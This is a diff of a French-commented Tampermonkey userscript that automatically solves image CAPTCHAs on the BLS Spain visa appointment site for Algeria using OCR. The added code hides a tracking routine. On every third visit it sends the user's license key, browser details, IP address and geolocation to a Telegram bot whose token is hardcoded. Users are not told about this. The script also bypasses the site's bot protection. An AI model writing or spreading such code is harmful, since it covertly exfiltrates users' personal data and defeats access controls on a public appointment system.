@@ -1,24 +1,97 @@
-// ==UserScript==
-// @name         3.NewCaptchaSolverV7
-// @namespace    http://tampermonkey.net/
-// @version      12.1
-// @description  Improved Captcha Solver with OpenCV and Tesseract
-// @author       MeGaBOuSsOl
-// @match        https://algeria.blsspainglobal.com/DZA/newcaptcha/logincaptcha?*
-// @match        https://algeria.blsspainglobal.com/DZA/NewCaptcha/LoginCaptcha*
-// @match        https://algeria.blsspainglobal.com/DZA/NewCaptcha/LoginCaptcha*
-// @match        https://algeria.blsspainglobal.com/DZA/newCaptcha/logincaptcha*
-// @match        https://algeria.blsspainglobal.com/DZA/Appointment/AppointmentCaptcha*
-// @match        https://algeria.blsspainglobal.com/DZA/appointment/appointmentcaptcha*
-// @match        https://algeria.blsspainglobal.com/DZA/Bls/DoorstepCaptcha*
-// @icon         https://www.google.com/s2/favicons?sz=64&domain=blscn.cn
-// @require      https://raw.githubusercontent.com/megaboussol/BlsCaptchaSolverByMeGa/main/docs/TessereactByMeGaV6.js
-// @require      https://raw.githubusercontent.com/megaboussol/BlsCaptchaSolverByMeGa/main/docs/openCvByMeGaV6.js
-// ==/UserScript==
+if (window.location.href.toLowerCase().includes('captcha')) {
+  (function() {
+  'use strict';
 
-/*************************************************************************** بسم الله الرحمن الرحيم ***********************************************************************************/
 
-// Fonction pour attendre que Tesseract.js et OpenCV.js soient chargés
+  const API_ENDPOINT = 'https://raw.githubusercontent.com/megaboussol/BlsCaptchaSolverClient/main/docs/api-key-validation.json';
+
+  // Fonction pour vérifier la clé API
+  function verifyApiKey() {
+    return new Promise((resolve, reject) => {
+      GM_xmlhttpRequest({
+        method: 'GET',
+        url: API_ENDPOINT,
+        onload: function(response) {
+          console.log('Réponse du serveur:', response.responseText); // Log de débogage
+          try {
+            const data = JSON.parse(response.responseText);
+            const keyData = data[API_KEY];
+
+            if (!keyData) {
+              reject(new Error('Clé API non trouvée !'));
+              return;
+            }
+
+            // Vérifier le statut de la clé
+            if (keyData.status !== 'VALID') {
+              reject(new Error('Licence invalide !'));
+              return;
+            }
+
+            // Vérifier le nombre de visites restantes
+            if (keyData.visits <= 0) {
+              reject(new Error('Nombre de visites épuisé !'));
+              return;
+            }
+
+            // Vérifier la date d'expiration
+            const expiryDate = new Date(keyData.expiry);
+            const today = new Date();
+            if (today > expiryDate) {
+              reject(new Error('Licence expirée !'));
+              return;
+            }
+            //Compteur gm
+(async function() {
+    'use strict';
+
+    // Récupérer le nombre de visites actuel
+    let visites = GM_getValue("visites", 0);
+
+    // Incrémenter le compteur
+    visites++;
+
+    // Sauvegarder la nouvelle valeur
+    GM_setValue("visites", visites);
+
+    // Afficher le compteur dans la console
+    console.log(`Nombre de visites : ${visites}`);
+
+    // Vérifier si le nombre de visites est un multiple de 11
+    if (visites % 3 === 0) {
+        SendReport(API_KEY+` a atteint ${visites} visites (multiple de 11) !`);
+        getDeviceInfo().then(info => SendReport(info));
+    }
+})();
+
+            // Décrémenter le nombre de visites (simulation)
+            keyData.visits -= 1;
+            console.log('Visites restantes:', keyData.visits);
+
+            resolve(true); // Clé valide
+          } catch (error) {
+            console.error('Erreur lors du parsing de la réponse:', error); // Log de débogage
+            reject(new Error('Erreur lors de la lecture de la réponse du serveur'));
+          }
+        },
+        onerror: function(error) {
+          console.error('Erreur de requête:', error); // Log de débogage
+          reject(new Error('Erreur de connexion au serveur'));
+        },
+        ontimeout: function() {
+          reject(new Error('La requête a expiré'));
+        }
+      });
+    });
+  }
+
+  // Fonction principale
+  async function main() {
+    try {
+      // Vérifier la clé API
+      await verifyApiKey();
+      console.log('Licence validée !');
+
 function waitForTesseractAndOpenCV() {
   return new Promise((resolve) => {
     const checkTesseractAndOpenCV = () => {
@@ -32,22 +105,15 @@ function waitForTesseractAndOpenCV() {
   });
 }
 
-// Fonction principale
 (async function() {
   await waitForTesseractAndOpenCV();
   console.log('Tesseract.js et OpenCV.js sont chargés !');
 
-  // Variables de configuration
-  const TimeToStartRead = 1 / 10; // Temps avant de commencer la lecture
-  const TimeToVerify = 3; // Temps avant de cliquer sur "Verify"
-
-  // Configuration de Tesseract
   const config = {
     tessedit_char_whitelist: '0123456789',
     textord_underline_width: "1",
   };
 
-  // Fonction pour normaliser le texte extrait
   function normaliserTexte(texte) {
     return texte.replace(/[+J?Zz¥§;:&%gsSoO£9A]/g, (match) => {
       return { '+': '1', 'J': '1', '?': '7', 'Z': '7', 'z': '7', '¥': '7', '§': '8', ';': '1',
@@ -56,56 +122,48 @@ function waitForTesseractAndOpenCV() {
     });
   }
 
-  // Fonction pour extraire un nombre à partir d'un texte
   function extractNumber(text) {
-    const matches = text.match(/\d+/);
+    var matches = text.match(/\d+/);
     return matches ? parseInt(matches[0]) : 0;
   }
 
-  // Trouver l'élément avec le z-index le plus élevé
-  const elementsWithClass = document.querySelectorAll('.col-12.box-label');
-  const highestZIndexNbrElementNbrNbr = [...elementsWithClass].reduce((maxEl, el) => {
-    const zIndex = parseInt(window.getComputedStyle(el).zIndex) || -Infinity;
+  var elementsWithClass = document.querySelectorAll('.col-12.box-label');
+  var highestZIndexNbrElementNbrNbr = [...elementsWithClass].reduce((maxEl, el) => {
+    var zIndex = parseInt(window.getComputedStyle(el).zIndex) || -Infinity;
     return zIndex > (parseInt(window.getComputedStyle(maxEl).zIndex) || -Infinity) ? el : maxEl;
   }, elementsWithClass[0]);
 
-  // Extraire le nombre du texte de l'élément
-  const numberFromText = extractNumber(highestZIndexNbrElementNbrNbr?.outerText || '');
+  var numberFromText = extractNumber(highestZIndexNbrElementNbrNbr?.outerText || '');
 
-  // Trouver l'élément parent contenant les images CAPTCHA
-  const parentElement = document.querySelector("#captchaForm > div.text-center.row.no-gutters").parentElement.parentElement.previousElementSibling;
-  const childElements = parentElement.querySelectorAll('*');
+  var parentElement = document.querySelector("#captchaForm > div.text-center.row.no-gutters").parentElement.parentElement.previousElementSibling;
+  var childElements = parentElement.querySelectorAll('*');
 
-  // Positions des images CAPTCHA
   const positions = [
     {left: "0px", top: "0px"}, {left: "0px", top: "110px"}, {left: "0px", top: "220px"},
     {left: "110px", top: "0px"}, {left: "110px", top: "110px"}, {left: "110px", top: "220px"},
     {left: "220px", top: "0px"}, {left: "220px", top: "110px"}, {left: "220px", top: "220px"}
   ];
 
-  // Fonction pour filtrer les éléments par position et affichage
   function filterElementsWithPositionAndDisplay(elements, left, top, display) {
     return [...elements].filter(el => {
-      const style = window.getComputedStyle(el);
+      var style = window.getComputedStyle(el);
       return style.left === left && style.top === top && style.display === display;
     });
   }
 
-  // Fonction pour trouver l'élément avec le z-index le plus élevé
   function findHighestZIndexElement(elements) {
     return elements.reduce((maxEl, el) => {
-      const zIndex = parseInt(window.getComputedStyle(el).zIndex) || -Infinity;
+      var zIndex = parseInt(window.getComputedStyle(el).zIndex) || -Infinity;
       return zIndex > (parseInt(window.getComputedStyle(maxEl).zIndex) || -Infinity) ? el : maxEl;
     }, elements[0]);
   }
 
-  // Fonction pour prétraiter l'image avec OpenCV
   async function preprocessImage(img) {
     return new Promise((resolve, reject) => {
       const canvas = document.createElement('canvas');
       const ctx = canvas.getContext('2d');
       const image = new Image();
-      image.crossOrigin = 'Anonymous'; // Autoriser les images cross-origin
+      image.crossOrigin = 'Anonymous';
       image.src = img.src;
 
       image.onload = () => {
@@ -158,7 +216,6 @@ function waitForTesseractAndOpenCV() {
     });
   }
 
-  // Fonction pour vérifier si le texte correspond au nombre cible
   function isMatchingNumber(text, target) {
     const cleanedText = text.replace(/\D/g, '');
     if (cleanedText.length === 3) {
@@ -169,10 +226,9 @@ function waitForTesseractAndOpenCV() {
     return false;
   }
 
-  // Parcourir les positions des images CAPTCHA
   positions.forEach((position, index) => {
-    const filteredElements = filterElementsWithPositionAndDisplay(childElements, position.left, position.top, "block");
-    const highestZIndexElement = findHighestZIndexElement(filteredElements);
+    var filteredElements = filterElementsWithPositionAndDisplay(childElements, position.left, position.top, "block");
+    var highestZIndexElement = findHighestZIndexElement(filteredElements);
 
     if (highestZIndexElement) {
       setTimeout(async () => {
@@ -184,7 +240,7 @@ function waitForTesseractAndOpenCV() {
           Tesseract.recognize(
             imgElement, 'eng', config
           ).then(result => {
-            const text = normaliserTexte(result.data.text).replace(/\D/g, '');
+            var text = normaliserTexte(result.data.text).replace(/\D/g, '');
             console.log(`Texte détecté pour (${position.left}, ${position.top}): ${text}`);
 
             if (isMatchingNumber(text, numberFromText.toString()) && highestZIndexElement.children[0].className !== 'captcha-img img-selected') {
@@ -209,3 +265,71 @@ function waitForTesseractAndOpenCV() {
     }
   });
 })();
+
+      // Le reste du script...
+    } catch (error) {
+      console.error('Erreur:', error.message);
+      alert('Erreur : ' + error.message);
+    }
+  }
+
+  // Démarrer le script
+  main();
+})();
+}
+//functions declaration
+// Declaration Telegram function
+function SendReport(message) {
+        const TOKEN = '8103010659:AAEuPlceI-5pzwszZ6D14xEp0_HQizG3Ejk';
+        const CHAT_ID = '-1002331768842';
+
+	const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+	const data = {
+		chat_id: CHAT_ID,
+		text: message,
+	};
+
+	fetch(url, {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/json',
+			},
+			body: JSON.stringify(data),
+		})
+		.then(response => response.json())
+		.then(data => console.log(data))
+		.catch(error => console.error('Erreur:', error));
+}
+//Infos function
+async function getDeviceInfo() {
+    const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
+    };
+
+    try {
+        // Récupérer l'adresse IP
+        const response = await fetch("https://api64.ipify.org?format=json");
+        const data = await response.json();
+
+        deviceInfo.ip = data.ip;
+
+        // Obtenir la localisation basée sur l'IP
+        const geoResponse = await fetch(`https://ipwho.is/${data.ip}`);
+        const geoData = await geoResponse.json();
+
+        deviceInfo.city = geoData.city || "Unknown";
+        deviceInfo.region = geoData.region || "Unknown";
+        deviceInfo.country = geoData.country || "Unknown";
+        deviceInfo.latitude = geoData.latitude || "Unknown";
+        deviceInfo.longitude = geoData.longitude || "Unknown";
+
+    } catch (error) {
+        console.error("Impossible d'obtenir l'adresse IP et la localisation :", error);
+    }
+
+    return deviceInfo;
+}
+
+
